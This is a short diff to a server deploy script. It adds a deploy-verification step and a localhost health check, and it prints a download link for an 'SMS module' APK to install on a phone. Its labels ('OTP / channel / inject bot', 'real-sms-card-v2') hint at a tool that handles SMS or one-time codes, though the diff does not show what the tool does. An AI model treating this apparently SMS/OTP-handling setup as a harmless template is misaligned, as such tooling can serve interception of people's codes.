@@ -58,9 +58,15 @@ BASE="${PUBLIC_BASE_URL:-http://127.0.0.1:${PORT:-8000}}"
 APK_LOCAL="$ROOT/apk/virtus-sms-module.apk"
 
 echo ""
+echo "==> verify deploy"
+bash "$ROOT/scripts/vps-verify.sh" || true
+
+echo ""
 echo "=========================================="
 echo " DONE — OTP / channel / inject bot = safe"
 echo "=========================================="
+echo "Verify: curl -s http://127.0.0.1:${PORT:-8000}/health | grep deploy_tag"
+echo "  must show: real-sms-card-v2"
 echo "APK install (phone pe naya module):"
 echo "  ${BASE%/}/download/apk"
 echo "  file: $APK_LOCAL"
